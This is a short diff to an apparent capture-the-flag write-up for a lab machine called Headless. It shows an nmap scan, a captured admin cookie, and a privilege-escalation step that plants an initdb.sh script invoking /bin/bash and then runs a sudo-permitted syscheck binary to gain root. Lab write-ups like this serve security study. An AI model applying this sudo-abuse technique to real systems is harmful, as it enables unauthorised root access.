@@ -8,6 +8,7 @@
 sudo nmap -v -sC -sV -oA initial --min-rate 1000 10.129.170.0
 ```
 22 : OpenSSH 9.2p1
+
 5000 : Werkzeug/2.2.2 Python/3.11.2
 - Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
 ```bash
@@ -84,6 +85,6 @@ Headless
 6. Create a script named "initdb.sh"  in the current directory with just `/bin/bash`. 
 7. run the sudo command :
 ```bash
-sudo /usr/bin/bash
+sudo /usr/bin/syscheck
 ```
 8. We are root.
